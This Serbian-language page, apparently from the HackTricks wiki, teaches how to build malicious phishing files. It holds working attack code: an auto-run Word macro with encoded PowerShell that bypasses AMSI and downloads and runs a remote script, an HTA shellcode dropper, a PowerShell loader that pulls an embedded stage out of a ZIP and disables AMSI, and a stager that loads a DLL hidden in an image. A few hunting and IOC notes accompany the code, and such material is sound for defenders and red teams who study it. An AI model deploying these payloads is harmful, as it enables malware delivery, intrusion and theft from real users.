# Phishing fajlovi i dokumenti

{{#include ../../banners/hacktricks-training.md}}

## Office dokumenti

Microsoft Word vrši validaciju podataka fajla pre otvaranja. Validacija podataka se vrši u vidu identifikacije strukture podataka, u skladu sa OfficeOpenXML standardom. Ako se javi bilo koja greška tokom identifikacije strukture podataka, fajl koji se analizira neće biti otvoren.

Obično, Word fajlovi koji sadrže makroe koriste ekstenziju `.docm`. Međutim, moguće je promeniti ime fajla promenom ekstenzije i i dalje zadržati mogućnost izvršavanja makroa.\
Na primer, RTF fajl po dizajnu ne podržava makroe, ali DOCM fajl preimenovan u RTF biće obrađen od strane Microsoft Word i biće sposoban za izvršavanje makroa.\
Iste interne strukture i mehanizmi primenjuju se na sav softver iz Microsoft Office Suite (Excel, PowerPoint itd.).

Možete koristiti sledeću komandu da proverite koje ekstenzije će biti izvršavane od strane nekih Office programa:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX fajlovi koji referenciraju udaljeni template (File –Options –Add-ins –Manage: Templates –Go) koji uključuje macros mogu “izvršiti” macros takođe.

### Učitavanje spoljne slike

Idite na: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Moguće je koristiti macros za pokretanje proizvoljnog koda iz dokumenta.

#### Autoload functions

Što su češće, veća je verovatnoća da će ih AV detektovati.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Manually remove metadata

Idite na **File > Info > Inspect Document > Inspect Document**, što će otvoriti Document Inspector. Kliknite **Inspect**, a zatim **Remove All** pored **Document Properties and Personal Information**.

#### Doc Extension

Kada završite, izaberite padajući meni **Save as type**, promenite format sa **`.docx`** na **Word 97-2003 `.doc`**.  
Uradite ovo zato što ne možete sačuvati **macro's** unutar **`.docx`** i postoji stigma oko macro-enabled **`.docm`** ekstenzije (npr. thumbnail ikona ima veliki `!` i neki web/email gateway-ji ih potpuno blokiraju). Stoga je ova **legacy `.doc` ekstenzija najbolji kompromis**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA Files

An HTA is a Windows program that **combines HTML and scripting languages (such as VBScript and JScript)**. Kreira korisnički interfejs i izvršava se kao "fully trusted" aplikacija, bez ograničenja bezbednosnog modela browsera.

HTA se izvršava pomoću **`mshta.exe`**, koji je obično **installed** zajedno sa **Internet Explorer**, što čini **`mshta` dependant on IE**. Dakle, ako je IE deinstaliran, HTA fajlovi neće moći da se izvrše.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forsiranje NTLM autentifikacije

Postoji nekoliko načina da **forsirate NTLM autentifikaciju "na daljinu"**, na primer, možete dodati **nevidljive slike** u emailove ili HTML koje će korisnik otvoriti (čak i HTTP MitM?). Ili poslati žrtvi **adresu fajlova** koja će **pokrenuti** **autentifikaciju** samo otvaranjem foldera.

**Pogledajte ove ideje i još na sledećim stranicama:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Ne zaboravite da, osim što možete ukrasti hash ili autentifikaciju, takođe možete i izvesti **NTLM Relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Veoma efikasne kampanje isporučuju ZIP koji sadrži dva legitimna mamac dokumenta (PDF/DOCX) i maliciozni .lnk. Trik je u tome što je stvarni PowerShell loader smešten unutar sirovih bajtova ZIP-a posle jedinstvenog markera, a .lnk ga izdvaja i izvršava potpuno u memoriji.

Tipičan tok koji implementira .lnk PowerShell one-liner:

1) Pronađi originalni ZIP u uobičajenim putanjama: Desktop, Downloads, Documents, %TEMP%, %ProgramData% i nadređeni direktorijum trenutnog radnog direktorijuma.
2) Pročitaj ZIP bajtove i pronađi hardkodovani marker (npr. xFIQCV). Sve posle markera je ugrađeni PowerShell payload.
3) Kopiraj ZIP u %ProgramData%, raspakuj tamo i otvori mamac .docx da bi delovalo legitimno.
4) Zaobiđi AMSI za trenutni proces: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuskuj narednu fazu (npr. ukloni sve znakove #) i izvrši je u memoriji.

Primer PowerShell skeleta za izdvajanje i pokretanje ugrađene faze:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Napomene
- Dostava često zloupotrebljava ugledne PaaS poddomene (npr. *.herokuapp.com) i može gate-ovati payloads (servira benign ZIP-ove na osnovu IP/UA).
- Sledeća faza često dešifruje base64/XOR shellcode i izvršava ga putem Reflection.Emit + VirtualAlloc kako bi minimizovala tragove na disku.

Persistencija korišćena u istom lancu
- COM TypeLib hijacking of the Microsoft Web Browser control tako da IE/Explorer ili bilo koja aplikacija koja ga ugrađuje ponovo automatski pokrene payload. Pogledajte detalje i gotove komande ovde:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Potraga/IOCs
- ZIP fajlovi koji sadrže ASCII oznaku (npr. xFIQCV) dodat na podatke arhive.
- .lnk koji enumeriše roditeljske/user foldere da bi locirao ZIP i otvori lažni dokument.
- AMSI manipulacija putem [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Dugotrajne poslovne niti koje se završavaju linkovima hostovanim na pouzdanim PaaS domenima.

## Steganography-delimited payloads in images (PowerShell stager)

Nedavni loader lanci isporučuju obfuskovani JavaScript/VBS koji dekodira i pokreće Base64 PowerShell stager. Taj stager preuzima sliku (često GIF) koja sadrži Base64-encoded .NET DLL sakriven kao plain text između jedinstvenih start/end markera. Skript traži te delimitere (primeri viđeni u prirodi: «<<sudo_png>> … <<sudo_odt>>>»), izvlači tekst između, Base64-dekodira ga u bajtove, učita assembly in-memory i pozove poznatu entry metodu sa C2 URL-om.

Tok rada
- Stage 1: Archived JS/VBS dropper → dekodira ugrađeni Base64 → pokreće PowerShell stager sa -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → preuzima sliku, reže marker-delimited Base64, učitava .NET DLL in-memory i poziva njegovu metodu (npr. VAI) prosleđujući C2 URL i opcije.
- Stage 3: Loader preuzima finalni payload i tipično ga injektuje putem process hollowing u pouzdan binarni fajl (obično MSBuild.exe). Više o process hollowing i trusted utility proxy execution ovde:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell example to carve a DLL from an image and invoke a .NET method in-memory:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Beleške
- This is ATT&CK T1027.003 (steganography/marker-hiding). Markeri variraju između kampanja.
- AMSI/ETW bypass and string deobfuscation su često primenjeni pre učitavanja assembly-ja.
- Lov: skenirajte preuzete slike za poznatim delimiterima; identifikujte PowerShell koji pristupa slikama i odmah dekodira Base64 blobove.

See also stego tools and carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Ponavljajuća početna faza je mali, jako obfuskovan `.js` ili `.vbs` isporučen unutar arhive. Njegov jedini cilj je da dekodira ugrađeni Base64 string i pokrene PowerShell sa `-nop -w hidden -ep bypass` kako bi bootstrap-ovao sledeću fazu preko HTTPS.

Skelet logike (apstraktno):
- Pročitaj sadržaj sopstvenog fajla
- Pronađi Base64 blob između junk stringova
- Dekodiraj u ASCII PowerShell
- Izvrši pomoću `wscript.exe`/`cscript.exe` koji pozivaju `powershell.exe`

Indikatori za otkrivanje
- Arhivirani JS/VBS attachmenti koji pokreću `powershell.exe` sa `-enc`/`FromBase64String` u komandnoj liniji.
- `wscript.exe` koji pokreće `powershell.exe -nop -w hidden` iz korisničkih temp putanja.

## Windows files to steal NTLM hashes

Proverite stranicu o **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## Izvori

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
